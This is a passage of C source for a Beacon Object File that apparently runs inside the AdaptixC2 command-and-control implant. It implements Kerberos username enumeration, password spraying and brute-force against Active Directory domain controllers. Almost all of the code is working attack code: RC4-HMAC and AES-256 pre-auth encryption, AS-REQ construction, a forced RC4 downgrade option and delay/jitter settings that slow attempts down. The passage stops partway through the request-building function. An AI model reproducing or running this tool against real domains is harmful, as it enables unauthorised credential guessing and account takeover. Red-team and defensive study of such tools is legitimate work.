/*
 * kerbrute.c — AdaptixC2 Beacon Object File
 *
 * In-process Kerberos enumeration and brute-force.
 * Phase 1: AES-256-CTS-HMAC-SHA1-96 pre-auth support (RFC 3962).
 *   - Tries AES-256 first, falls back to RC4 on ETYPE_NOSUPP.
 *   - --downgrade forces RC4 only (legacy DCs).
 *
 * BOF argument layout (ax.bof_pack "cstr,cstr,cstr,cstr,int,int,int"):
 *   [z] list_b64  — base64-encoded file content
 *   [z] domain    — FQDN, e.g. "contoso.local"
 *   [z] dc        — DC hostname or IP ("" = DNS lookup)
 *   [z] single    — mode 1: password | mode 2: username | others: ""
 *   [i] mode      — 0=userenum 1=passwordspray 2=bruteuser 3=bruteforce
 *   [i] delay     — ms between each attempt (0 = no delay)
 *   [i] flags     — bit0=downgrade bit1=safe bit2=verbose
 *   [i] jitter    — ms of randomness added to each delay (0 = fixed delay)
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -masm=intel -Wall -Wno-unused-variable \
 *       -Wno-unused-function -Wno-misleading-indentation -fno-stack-check \
 *       -o kerbrute.x64.o -c kerbrute.c
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "beacon.h"

/* ── Dynamic API imports ─────────────────────────────────────────────────── */
/* WSAStartup/WSACleanup omitted — beacon has already initialised Winsock    */
WINBASEAPI SOCKET  WINAPI WS2_32$socket(int, int, int);
WINBASEAPI int     WINAPI WS2_32$connect(SOCKET, const struct sockaddr *, int);
WINBASEAPI int     WINAPI WS2_32$send(SOCKET, const char *, int, int);
WINBASEAPI int     WINAPI WS2_32$recv(SOCKET, char *, int, int);
WINBASEAPI int     WINAPI WS2_32$closesocket(SOCKET);
WINBASEAPI int     WINAPI WS2_32$setsockopt(SOCKET, int, int, const char *, int);
WINBASEAPI int     WINAPI WS2_32$getaddrinfo(PCSTR, PCSTR, const ADDRINFOA *, PADDRINFOA *);
WINBASEAPI void    WINAPI WS2_32$freeaddrinfo(PADDRINFOA);

WINBASEAPI LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
WINBASEAPI BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
WINBASEAPI HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
WINBASEAPI PVOID   WINAPI KERNEL32$RtlMoveMemory(PVOID, const void *, SIZE_T);
WINBASEAPI PVOID   WINAPI KERNEL32$RtlZeroMemory(PVOID, SIZE_T);
WINBASEAPI void    WINAPI KERNEL32$GetSystemTime(LPSYSTEMTIME);
WINBASEAPI int     WINAPI KERNEL32$lstrlenA(LPCSTR);
WINBASEAPI BOOL    WINAPI KERNEL32$QueryPerformanceCounter(LARGE_INTEGER *);
WINBASEAPI void    WINAPI KERNEL32$Sleep(DWORD);

typedef PVOID BCRYPT_ALG_HANDLE;
typedef PVOID BCRYPT_HASH_HANDLE;
typedef PVOID BCRYPT_KEY_HANDLE;
#ifndef BCRYPT_ALG_HANDLE_HMAC_FLAG
#define BCRYPT_ALG_HANDLE_HMAC_FLAG 0x00000008UL
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptOpenAlgorithmProvider(BCRYPT_ALG_HANDLE *, LPCWSTR, LPCWSTR, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptCreateHash(BCRYPT_ALG_HANDLE, BCRYPT_HASH_HANDLE *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptHashData(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptFinishHash(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptDestroyHash(BCRYPT_HASH_HANDLE);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptGenerateSymmetricKey(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptEncrypt(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, void *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG *, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptDestroyKey(BCRYPT_KEY_HANDLE);
/* Phase 1 additions */
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptSetProperty(PVOID, LPCWSTR, PUCHAR, ULONG, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptDeriveKeyPBKDF2(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, PUCHAR, ULONG, ULONGLONG, PUCHAR, ULONG, ULONG);

/* ── Macros ──────────────────────────────────────────────────────────────── */
#define Malloc(n)       KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (n))
#define Free(p)         KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, (p))
#define Memcpy(d,s,n)   KERNEL32$RtlMoveMemory((d),(s),(n))
#define Memset(d,v,n)   do{BYTE*_p=(BYTE*)(d);SIZE_T _n=(n);while(_n--)*_p++=(BYTE)(v);}while(0)
#define Strlen(s)       KERNEL32$lstrlenA(s)
#define Sleep(ms)       KERNEL32$Sleep(ms)

/* Stack probe stub — beacon loader doesn't export ___chkstk_ms */
void ___chkstk_ms(void) {}

/* Digit helpers — no sprintf dependency */
static void fmt2(char *p, int v) { p[0]='0'+v/10; p[1]='0'+v%10; }
static void fmt4(char *p, int v) {
    p[0]='0'+v/1000; p[1]='0'+v/100%10; p[2]='0'+v/10%10; p[3]='0'+v%10;
}

/* ── Kerberos constants ───────────────────────────────────────────────────── */
#define MAX_RESP                    4096
#define KDC_ERR_C_PRINCIPAL_UNKNOWN    6
#define KDC_ERR_CLIENT_REVOKED        18
#define KDC_ERR_KEY_EXPIRED           23
#define KDC_ERR_PREAUTH_FAILED        24
#define KDC_ERR_PREAUTH_REQUIRED      25
#define APP_AS_REP   0x6b
#define APP_KRB_ERR  0x7e
#define APP_AS_REQ   0x6a

#define MODE_USERENUM      0
#define MODE_SPRAY         1
#define MODE_BRUTEUSER     2
#define MODE_BRUTEFORCE    3

#define FLAG_DOWNGRADE  0x1
#define FLAG_SAFE       0x2
#define FLAG_VERBOSE    0x4
#define FLAG_ROAST      0x8

/* ── Shared context ──────────────────────────────────────────────────────── */
typedef struct {
    const char *dc, *domain, *password, *username;
    int   delay, jitter, downgrade, safe, verbose, roast;
    int   valid, notfound, locked, errors;
    int   aborted, done;
} krb_ctx;

/* ── Base64 decode ───────────────────────────────────────────────────────── */
static int b64val(char c) {
    if (c>='A'&&c<='Z') return c-'A';
    if (c>='a'&&c<='z') return 26+c-'a';
    if (c>='0'&&c<='9') return 52+c-'0';
    if (c=='+') return 62; if (c=='/') return 63; return -1;
}
static int b64_decode(const char *in, BYTE *out, int max) {
    int n=0, L=Strlen(in);
    for (int i=0; i<L;) {
        int v0=b64val(in[i++]), v1=(i<L?b64val(in[i++]):0);
        int v2=(i<L?b64val(in[i++]):-1), v3=(i<L?b64val(in[i++]):-1);
        if (v0<0) break; if (v1<0) v1=0;
        if (n<max) out[n++]=(BYTE)((v0<<2)|(v1>>4));
        if (v2>=0&&n<max) out[n++]=(BYTE)(((v1&0xf)<<4)|(v2>>2));
        if (v3>=0&&n<max) out[n++]=(BYTE)(((v2&0x3)<<6)|v3);
    }
    if (n<max) out[n]=0; return n;
}

/* ══════════════════════════════════════════════════════════════════════════
 * RC4-HMAC (etype 23, RFC 4757) — legacy / --downgrade path
 * ══════════════════════════════════════════════════════════════════════════ */

/* MD4 (RFC 1320) — NT hash only */
#define ROL32(v,n) (((v)<<(n))|((UINT32)(v)>>(32-(n))))
#define MD4F(x,y,z) (((x)&(y))|(~(x)&(z)))
#define MD4G(x,y,z) (((x)&(y))|((x)&(z))|((y)&(z)))
#define MD4H(x,y,z) ((x)^(y)^(z))
#define R1(a,b,c,d,x,s) a=ROL32(a+MD4F(b,c,d)+x,s)
#define R2(a,b,c,d,x,s) a=ROL32(a+MD4G(b,c,d)+x+0x5A827999u,s)
#define R3(a,b,c,d,x,s) a=ROL32(a+MD4H(b,c,d)+x+0x6ED9EBA1u,s)

static void md4_compress(UINT32 *s, const BYTE *blk) {
    UINT32 x[16],a=s[0],b=s[1],c=s[2],d=s[3];
    for (int i=0;i<16;i++) x[i]=(UINT32)blk[i*4]|((UINT32)blk[i*4+1]<<8)|((UINT32)blk[i*4+2]<<16)|((UINT32)blk[i*4+3]<<24);
    R1(a,b,c,d,x[0],3);  R1(d,a,b,c,x[1],7);  R1(c,d,a,b,x[2],11); R1(b,c,d,a,x[3],19);
    R1(a,b,c,d,x[4],3);  R1(d,a,b,c,x[5],7);  R1(c,d,a,b,x[6],11); R1(b,c,d,a,x[7],19);
    R1(a,b,c,d,x[8],3);  R1(d,a,b,c,x[9],7);  R1(c,d,a,b,x[10],11);R1(b,c,d,a,x[11],19);
    R1(a,b,c,d,x[12],3); R1(d,a,b,c,x[13],7); R1(c,d,a,b,x[14],11);R1(b,c,d,a,x[15],19);
    R2(a,b,c,d,x[0],3);  R2(d,a,b,c,x[4],5);  R2(c,d,a,b,x[8],9);  R2(b,c,d,a,x[12],13);
    R2(a,b,c,d,x[1],3);  R2(d,a,b,c,x[5],5);  R2(c,d,a,b,x[9],9);  R2(b,c,d,a,x[13],13);
    R2(a,b,c,d,x[2],3);  R2(d,a,b,c,x[6],5);  R2(c,d,a,b,x[10],9); R2(b,c,d,a,x[14],13);
    R2(a,b,c,d,x[3],3);  R2(d,a,b,c,x[7],5);  R2(c,d,a,b,x[11],9); R2(b,c,d,a,x[15],13);
    R3(a,b,c,d,x[0],3);  R3(d,a,b,c,x[8],9);  R3(c,d,a,b,x[4],11); R3(b,c,d,a,x[12],15);
    R3(a,b,c,d,x[2],3);  R3(d,a,b,c,x[10],9); R3(c,d,a,b,x[6],11); R3(b,c,d,a,x[14],15);
    R3(a,b,c,d,x[1],3);  R3(d,a,b,c,x[9],9);  R3(c,d,a,b,x[5],11); R3(b,c,d,a,x[13],15);
    R3(a,b,c,d,x[3],3);  R3(d,a,b,c,x[11],9); R3(c,d,a,b,x[7],11); R3(b,c,d,a,x[15],15);
    s[0]+=a; s[1]+=b; s[2]+=c; s[3]+=d;
}
static void md4(const BYTE *msg, int len, BYTE *out) {
    UINT32 s[4]={0x67452301u,0xEFCDAB89u,0x98BADCFEu,0x10325476u};
    int blocks=len/64;
    for (int i=0;i<blocks;i++) md4_compress(s, msg+i*64);
    BYTE pad[128]; Memset(pad,0,128);
    int rem=len%64; Memcpy(pad, msg+blocks*64, rem); pad[rem]=0x80;
    UINT64 bits=(UINT64)len*8;
    if (rem<56){Memcpy(pad+56,&bits,8); md4_compress(s,pad);}
    else{Memcpy(pad+120,&bits,8); md4_compress(s,pad); md4_compress(s,pad+64);}
    for (int i=0;i<4;i++){out[i*4+0]=(BYTE)s[i];out[i*4+1]=(BYTE)(s[i]>>8);out[i*4+2]=(BYTE)(s[i]>>16);out[i*4+3]=(BYTE)(s[i]>>24);}
}
static void nt_hash(const char *pw, BYTE *out) {
    int len=Strlen(pw);
    BYTE *u16=(BYTE*)Malloc((len+1)*2);
    for (int i=0;i<len;i++){u16[i*2]=(BYTE)pw[i];u16[i*2+1]=0;}
    md4(u16, len*2, out); Free(u16);
}

/* HMAC-MD5 via BCrypt */
static int hmac_md5(const BYTE *key, int kl, const BYTE *data, int dl, BYTE *out) {
    BCRYPT_ALG_HANDLE hA=NULL; BCRYPT_HASH_HANDLE hH=NULL;
    if (!NT_SUCCESS(BCRYPT$BCryptOpenAlgorithmProvider(&hA,L"MD5",NULL,BCRYPT_ALG_HANDLE_HMAC_FLAG))) return 0;
    if (!NT_SUCCESS(BCRYPT$BCryptCreateHash(hA,&hH,NULL,0,(PUCHAR)key,(ULONG)kl,0))){
        BCRYPT$BCryptCloseAlgorithmProvider(hA,0); return 0;}
    BCRYPT$BCryptHashData(hH,(PUCHAR)data,(ULONG)dl,0);
    BCRYPT$BCryptFinishHash(hH,out,16,0);
    BCRYPT$BCryptDestroyHash(hH); BCRYPT$BCryptCloseAlgorithmProvider(hA,0); return 1;
}

/* RC4 via BCrypt (in-place) */
static int rc4(const BYTE *key, int kl, BYTE *data, int dl) {
    BCRYPT_ALG_HANDLE hA=NULL; BCRYPT_KEY_HANDLE hK=NULL; ULONG res=0;
    if (!NT_SUCCESS(BCRYPT$BCryptOpenAlgorithmProvider(&hA,L"RC4",NULL,0))) return 0;
    if (!NT_SUCCESS(BCRYPT$BCryptGenerateSymmetricKey(hA,&hK,NULL,0,(PUCHAR)key,(ULONG)kl,0))){
        BCRYPT$BCryptCloseAlgorithmProvider(hA,0); return 0;}
    BCRYPT$BCryptEncrypt(hK,data,(ULONG)dl,NULL,NULL,0,data,(ULONG)dl,&res,0);
    BCRYPT$BCryptDestroyKey(hK); BCRYPT$BCryptCloseAlgorithmProvider(hA,0); return 1;
}

/*
 * RC4-HMAC Kerberos encrypt (RFC 4757)
 * K1 = HMAC-MD5(nt_hash, LE32(key_usage=1))
 * Checksum = HMAC-MD5(K1, confounder || plaintext)
 * K3 = HMAC-MD5(K1, Checksum)
 * Cipher = RC4(K3, confounder || plaintext)
 * Result = Checksum(16) || Cipher
 */
static int rc4hmac_encrypt(const BYTE *nthash, int usage,
                            const BYTE *pt, int ptlen, BYTE *out, int outmax) {
    if (outmax < 16+8+ptlen) return -1;
    BYTE T[4]={(BYTE)usage,0,0,0}, K1[16];
    if (!hmac_md5(nthash,16,T,4,K1)) return -1;
    LARGE_INTEGER q; KERNEL32$QueryPerformanceCounter(&q);
    BYTE conf[8];
    for (int i=0;i<8;i++) conf[i]=(BYTE)(q.QuadPart>>(i*7))^(BYTE)(0x5c^i);
    int bplen=8+ptlen; BYTE *bp=(BYTE*)Malloc(bplen);
    Memcpy(bp,conf,8); Memcpy(bp+8,pt,ptlen);
    BYTE ck[16],K3[16];
    if (!hmac_md5(K1,16,bp,bplen,ck)){Free(bp);return -1;}
    if (!hmac_md5(K1,16,ck,16,K3)){Free(bp);return -1;}
    if (!rc4(K3,16,bp,bplen)){Free(bp);return -1;}
    Memcpy(out,ck,16); Memcpy(out+16,bp,bplen); Free(bp);
    return 16+bplen;
}

/* ══════════════════════════════════════════════════════════════════════════
 * AES-256-CTS-HMAC-SHA1-96 (etype 18, RFC 3962) — modern pre-auth path
 * ══════════════════════════════════════════════════════════════════════════ */

/*
 * 13-bit right rotation of a byte string (RFC 3961 §5.1).
 * Output bit i = input bit (i - 13 + total_bits) % total_bits.
 */
static void rot13(const BYTE *in, BYTE *out, int len) {
    int total = len * 8;
    Memset(out, 0, len);
    for (int i = 0; i < total; i++) {
        int src  = (i - 13 + total) % total;
        int sbit = (in[src/8] >> (7 - src%8)) & 1;
        if (sbit) out[i/8] |= (1 << (7 - i%8));
    }
}

/*
 * n-fold (RFC 3961 §5.1).
 * Expands in_len bytes to out_len bytes using 13-bit rotated copies,
 * then folds right-to-left with byte-wide addition-and-carry.
 */
static void nfold(const BYTE *in, int in_len, BYTE *out, int out_len) {
    int lcm = out_len;
    while (lcm % in_len != 0) lcm += out_len;

    BYTE *exp = (BYTE*)Malloc(lcm);
    BYTE *cur = (BYTE*)Malloc(in_len);
    BYTE *nxt = (BYTE*)Malloc(in_len);
    Memcpy(cur, in, in_len);

    for (int i = 0; i < lcm; i += in_len) {
        Memcpy(exp + i, cur, in_len);
        rot13(cur, nxt, in_len);
        BYTE *t = cur; cur = nxt; nxt = t;
    }
    Free(cur); Free(nxt);

    /* Fold right-to-left with carry */
    Memset(out, 0, out_len);
    int carry = 0;
    for (int i = lcm - 1; i >= 0; i--) {
        int oi = i % out_len;
        int v  = out[oi] + exp[i] + carry;
        out[oi] = (BYTE)(v & 0xFF);
        carry   = v >> 8;
    }
    for (int k = out_len - 1; carry; k = (k - 1 + out_len) % out_len) {
        int v = out[k] + carry;
        out[k] = (BYTE)(v & 0xFF);
        carry  = v >> 8;
    }
    Free(exp);
}

/*
 * AES-256-ECB: encrypt one 16-byte block.
 * Used for the DK key derivation (K(1), K(2) computation).
 */
static int aes256_ecb_block(const BYTE *key32, const BYTE *block, BYTE *out16) {
    BCRYPT_ALG_HANDLE hA = NULL;
    BCRYPT_KEY_HANDLE hK = NULL;
    ULONG result = 0;

    if (!NT_SUCCESS(BCRYPT$BCryptOpenAlgorithmProvider(&hA, L"AES", NULL, 0)))
        return 0;

    /* ECB: no chaining, no IV */
    BYTE mode[] = "ChainingModeECB\0";
    BCRYPT$BCryptSetProperty(hA, L"ChainingMode", mode, 16 * sizeof(BYTE), 0);

    if (!NT_SUCCESS(BCRYPT$BCryptGenerateSymmetricKey(hA, &hK, NULL, 0,
                                                       (PUCHAR)key32, 32, 0))) {
        BCRYPT$BCryptCloseAlgorithmProvider(hA, 0); return 0;
    }
    BYTE tmp[16]; Memcpy(tmp, block, 16);
    NTSTATUS st = BCRYPT$BCryptEncrypt(hK, tmp, 16, NULL, NULL, 0, out16, 16, &result, 0);
    BCRYPT$BCryptDestroyKey(hK);
    BCRYPT$BCryptCloseAlgorithmProvider(hA, 0);
    return NT_SUCCESS(st) ? 1 : 0;
}

/*
 * DK(Key, Constant) for AES-256 (RFC 3961 §5.1).
 * blk = n-fold(Constant, AES_block_size=128 bits) → 16 bytes
 * K(1) = AES-256-ECB(Key, blk)           → 16 bytes
 * K(2) = AES-256-ECB(Key, K(1))          → 16 bytes
 * DK   = K(1) || K(2)                    → 32 bytes
 */
static int dk_aes256(const BYTE *key, const BYTE *constant, int clen, BYTE *out32) {
    BYTE blk[16], K1[16], K2[16];
    nfold(constant, clen, blk, 16);
    if (!aes256_ecb_block(key, blk, K1)) return 0;
    if (!aes256_ecb_block(key, K1, K2))  return 0;
    Memcpy(out32,      K1, 16);
    Memcpy(out32 + 16, K2, 16);
    return 1;
}

/*
 * AES-256 string2key (RFC 3962):
 *   tkey      = PBKDF2-HMAC-SHA1(password, realm||username, 4096, 32)
 *   base_key  = DK(tkey, "kerberos")
 *
 * salt = realm_upper || username  (e.g. "TOKYO.LOCALjdoe")
 */
static int str2key_aes256(const char *password,
                           const char *realm_upper, const char *username,
                           BYTE *base_key) {
    /* Build salt */
    int rl = Strlen(realm_upper), ul = Strlen(username);
    BYTE *salt = (BYTE*)Malloc(rl + ul);
    Memcpy(salt,      realm_upper, rl);
    Memcpy(salt + rl, username,    ul);

    /* PBKDF2-HMAC-SHA1 */
    BCRYPT_ALG_HANDLE hA = NULL;
    BYTE tkey[32];
    NTSTATUS st;

    st = BCRYPT$BCryptOpenAlgorithmProvider(&hA, L"SHA1", NULL,
                                             BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (!NT_SUCCESS(st)) { Free(salt); return 0; }

    st = BCRYPT$BCryptDeriveKeyPBKDF2(hA,
             (PUCHAR)password, (ULONG)Strlen(password),
             salt, (ULONG)(rl + ul),
             4096, tkey, 32, 0);
    BCRYPT$BCryptCloseAlgorithmProvider(hA, 0);
    Free(salt);
    if (!NT_SUCCESS(st)) return 0;

    /* DK(tkey, "kerberos") */
    return dk_aes256(tkey, (const BYTE *)"kerberos", 8, base_key);
}

/*
 * AES-256-CBC encrypt using BCrypt.
 * out_len must be a multiple of 16 and >= pt_len.
 * iv is modified in-place by BCrypt (set to last cipher block).
 */
static int aes256_cbc(const BYTE *key, BYTE *iv, const BYTE *pt, int ptlen,
                       BYTE *out, int outlen) {
    BCRYPT_ALG_HANDLE hA = NULL;
    BCRYPT_KEY_HANDLE hK = NULL;
    ULONG result = 0;

    if (!NT_SUCCESS(BCRYPT$BCryptOpenAlgorithmProvider(&hA, L"AES", NULL, 0)))
        return 0;

    BYTE mode[] = "ChainingModeCBC\0";
    BCRYPT$BCryptSetProperty(hA, L"ChainingMode", mode, 16 * sizeof(BYTE), 0);

    if (!NT_SUCCESS(BCRYPT$BCryptGenerateSymmetricKey(hA, &hK, NULL, 0,
                                                       (PUCHAR)key, 32, 0))) {
        BCRYPT$BCryptCloseAlgorithmProvider(hA, 0); return 0;
    }
    NTSTATUS st = BCRYPT$BCryptEncrypt(hK, (PUCHAR)pt, (ULONG)ptlen, NULL,
                                        iv, 16, out, (ULONG)outlen, &result, 0);
    BCRYPT$BCryptDestroyKey(hK);
    BCRYPT$BCryptCloseAlgorithmProvider(hA, 0);
    return NT_SUCCESS(st) ? 1 : 0;
}

/*
 * AES-256-CTS encrypt (Kerberos mode, RFC 3962).
 * IV = zeros.  msg_len must be >= 16.
 * CTS output = same length as input (msg_len bytes).
 *
 * Algorithm:
 *  1. Pad msg to multiple of 16 (zero-pad)
 *  2. AES-256-CBC → padded ciphertext CT
 *  3. CTS swap:
 *     extra = msg_len % 16
 *     If extra == 0: swap last two 16-byte blocks of CT
 *     If extra != 0: output[prefix] = CT[-1] (16 bytes) || CT[-2][0:extra]
 */
static int aes256_cts(const BYTE *key, const BYTE *msg, int msg_len, BYTE *out) {
    if (msg_len < 16) return 0;

    int padded = (msg_len + 15) & ~15;
    BYTE *ptpad = (BYTE*)Malloc(padded);
    BYTE *ct    = (BYTE*)Malloc(padded);
    Memset(ptpad, 0, padded);
    Memcpy(ptpad, msg, msg_len);

    BYTE iv[16]; Memset(iv, 0, 16);
    int ok = aes256_cbc(key, iv, ptpad, padded, ct, padded);
    Free(ptpad);
    if (!ok) { Free(ct); return 0; }

    int extra  = msg_len % 16;
    int prefix = msg_len - extra - 16; /* bytes before the last two "blocks" */
    if (prefix < 0) prefix = 0;

    if (extra == 0) {
        /* Two full trailing blocks: swap them */
        Memcpy(out,                ct,              msg_len - 32);
        Memcpy(out + msg_len - 32, ct + msg_len - 16, 16);
        Memcpy(out + msg_len - 16, ct + msg_len - 32, 16);
    } else {
        /* Partial trailing block */
        if (prefix > 0) Memcpy(out, ct, prefix);
        Memcpy(out + prefix,        ct + msg_len - extra, 16);     /* last CBC block */
        Memcpy(out + prefix + 16,   ct + msg_len - extra - 16, extra); /* stolen bytes */
    }

    Free(ct);
    return 1;
}

/* HMAC-SHA1 truncated to 12 bytes (SHA1-96) */
static int hmac_sha1_96(const BYTE *key, int klen,
                          const BYTE *data, int dlen, BYTE *out12) {
    BCRYPT_ALG_HANDLE hA = NULL;
    BCRYPT_HASH_HANDLE hH = NULL;
    BYTE full[20];

    if (!NT_SUCCESS(BCRYPT$BCryptOpenAlgorithmProvider(&hA, L"SHA1", NULL,
                                                        BCRYPT_ALG_HANDLE_HMAC_FLAG)))
        return 0;
    if (!NT_SUCCESS(BCRYPT$BCryptCreateHash(hA, &hH, NULL, 0,
                                             (PUCHAR)key, (ULONG)klen, 0))) {
        BCRYPT$BCryptCloseAlgorithmProvider(hA, 0); return 0;
    }
    BCRYPT$BCryptHashData(hH, (PUCHAR)data, (ULONG)dlen, 0);
    BCRYPT$BCryptFinishHash(hH, full, 20, 0);
    BCRYPT$BCryptDestroyHash(hH);
    BCRYPT$BCryptCloseAlgorithmProvider(hA, 0);
    Memcpy(out12, full, 12);
    return 1;
}

/*
 * Full AES-256-CTS-HMAC-SHA1-96 encrypt (RFC 3962 §5).
 *
 * ke = DK(base_key, LE32(key_usage) || 0xAA)  — encryption key
 * ki = DK(base_key, LE32(key_usage) || 0x55)  — integrity key
 *
 * msg = random_16_byte_confounder || plaintext
 * result = AES-256-CTS(ke, msg) || HMAC-SHA1-96(ki, msg)
 */
static int aes256_cts_hmac_encrypt(const BYTE *base_key, int key_usage,
                                    const BYTE *pt, int ptlen,
                                    BYTE *out, int outmax) {
    int msg_len = 16 + ptlen;
    if (outmax < msg_len + 12) return -1;

    /* Derive ke and ki */
    BYTE usage_enc[5] = {(BYTE)(key_usage>>24),(BYTE)(key_usage>>16),
                          (BYTE)(key_usage>>8), (BYTE)key_usage, 0xAA};
    BYTE usage_int[5] = {(BYTE)(key_usage>>24),(BYTE)(key_usage>>16),
                          (BYTE)(key_usage>>8), (BYTE)key_usage, 0x55};
    BYTE ke[32], ki[32];
    if (!dk_aes256(base_key, usage_enc, 5, ke)) return -1;
    if (!dk_aes256(base_key, usage_int, 5, ki)) return -1;

    /* Build confounder || plaintext */
    BYTE *msg = (BYTE*)Malloc(msg_len);
    LARGE_INTEGER q; KERNEL32$QueryPerformanceCounter(&q);
    for (int i = 0; i < 16; i++) msg[i] = (BYTE)(q.QuadPart >> (i*5)) ^ (BYTE)(0xa3^i);
    Memcpy(msg + 16, pt, ptlen);

    /* AES-256-CTS encrypt into out */
    if (!aes256_cts(ke, msg, msg_len, out)) { Free(msg); return -1; }

    /* HMAC-SHA1-96 of the pre-encryption message, appended */
    if (!hmac_sha1_96(ki, 32, msg, msg_len, out + msg_len)) { Free(msg); return -1; }

    Free(msg);
    return msg_len + 12;
}

/* ── DER encoding helpers ────────────────────────────────────────────────── */
static int dwlen(BYTE *p, int len) {
    if (len<0x80)  {p[0]=(BYTE)len; return 1;}
    if (len<=0xFF) {p[0]=0x81; p[1]=(BYTE)len; return 2;}
    p[0]=0x82; p[1]=(BYTE)(len>>8); p[2]=(BYTE)len; return 3;
}
static int dtlv(BYTE *p, BYTE tag, const BYTE *val, int vlen) {
    int off=0; p[off++]=tag; off+=dwlen(p+off,vlen);
    if (val&&vlen>0) Memcpy(p+off,val,vlen); return off+vlen;
}

/* ── PA-ENC-TS-ENC plaintext (shared by both RC4 and AES paths) ──────────── */
static int build_pa_enc_ts(BYTE *buf) {
    SYSTEMTIME st; KERNEL32$GetSystemTime(&st);
    char ts[16];
    fmt4(ts,    st.wYear);
    fmt2(ts+4,  (int)st.wMonth);
    fmt2(ts+6,  (int)st.wDay);
    fmt2(ts+8,  (int)st.wHour);
    fmt2(ts+10, (int)st.wMinute);
    fmt2(ts+12, (int)st.wSecond);
    ts[14]='Z'; ts[15]=0;
    int tl=15;
    BYTE gt[20]; int gl=dtlv(gt,0x18,(BYTE*)ts,tl);
    BYTE gc[25]; int gcl=dtlv(gc,0xa0,gt,gl);
    return dtlv(buf,0x30,gc,gcl);
}

/*
 * Wrap cipher bytes into SEQUENCE OF PA-DATA structure.
 * etype: 17=AES128, 18=AES256, 23=RC4-HMAC
 */
static int build_padata_from_cipher(BYTE *buf, int bsz,
                                     int etype, const BYTE *cipher, int clen) {
    BYTE etv[4] = {0x02, 0x01, (BYTE)etype, 0};
    int  etvlen = (etype > 127) ? 4 : 3;  /* handle 2-byte etype if needed */
    /* Simpler: always use 2-byte representation for etype if > 127 */
    BYTE etype_der[6]; int etder_len;
    if (etype <= 127) {
        BYTE tmp[] = {0x02,0x01,(BYTE)etype};
        etder_len = 3; Memcpy(etype_der, tmp, 3);
    } else {
        BYTE tmp[] = {0x02,0x02,(BYTE)(etype>>8),(BYTE)etype};
        etder_len = 4; Memcpy(etype_der, tmp, 4);
    }

    BYTE etc[8]; int etl = dtlv(etc, 0xa0, etype_der, etder_len);
    BYTE cos[270]; int col = dtlv(cos, 0x04, cipher, clen);
    BYTE coc[280]; int ccl = dtlv(coc, 0xa2, cos, col);
    BYTE edin[300]; int edi = 0;
    Memcpy(edin, etc, etl); edi += etl;
    Memcpy(edin+edi, coc, ccl); edi += ccl;
    BYTE eds[310]; int esl = dtlv(eds, 0x30, edin, edi);

    BYTE ptv[] = {0x02,0x01,0x02};
    BYTE ptc[8]; int ptl = dtlv(ptc, 0xa1, ptv, sizeof(ptv));
    BYTE pvos[330]; int pvl = dtlv(pvos, 0x04, eds, esl);
    BYTE pvoc[340]; int pcl = dtlv(pvoc, 0xa2, pvos, pvl);
    BYTE pdin[360]; int pdi = 0;
    Memcpy(pdin, ptc, ptl); pdi += ptl;
    Memcpy(pdin+pdi, pvoc, pcl); pdi += pcl;
    BYTE pds[380]; int psl = dtlv(pds, 0x30, pdin, pdi);
    int total = dtlv(buf, 0x30, pds, psl);
    return (total <= bsz) ? total : -1;
}

/* RC4-HMAC padata (etype 23) */
static int build_padata_rc4(BYTE *buf, int bsz, const BYTE *nthash) {
    BYTE pts[48]; int ptslen = build_pa_enc_ts(pts);
    BYTE cipher[128];
    int  clen = rc4hmac_encrypt(nthash, 1, pts, ptslen, cipher, sizeof(cipher));
    if (clen < 0) return -1;
    return build_padata_from_cipher(buf, bsz, 23, cipher, clen);
}

/* AES-256-CTS-HMAC-SHA1-96 padata (etype 18) */
static int build_padata_aes256(BYTE *buf, int bsz, const BYTE *base_key) {
    BYTE pts[48]; int ptslen = build_pa_enc_ts(pts);
    BYTE cipher[256];
    int  clen = aes256_cts_hmac_encrypt(base_key, 1, pts, ptslen,
                                         cipher, sizeof(cipher));
    if (clen < 0) return -1;
    return build_padata_from_cipher(buf, bsz, 18, cipher, clen);
}

/* ── Build AS-REQ ────────────────────────────────────────────────────────── */
static int build_as_req(BYTE *buf, int bsz,
                         const char *username, const char *domain_in,
                         const BYTE *padata, int padatalen,
                         int downgrade) {
    int domlen=Strlen(domain_in);
    BYTE realm[128]; Memset(realm,0,128);
    for (int i=0;i<domlen&&i<127;i++){char c=domain_in[i];realm[i]=(BYTE)((c>='a'&&c<='z')?c-0x20:c);}
    int ul=Strlen(username), rl=Strlen((char*)realm);

    BYTE opts[]={0x03,0x05,0x00,0x40,0x81,0x00,0x10};
    BYTE etin_full[]={0x02,0x01,0x12,0x02,0x01,0x11,0x02,0x01,0x17};
    BYTE etin_rc4[] ={0x02,0x01,0x17};
    BYTE *etin   = downgrade ? etin_rc4 : etin_full;
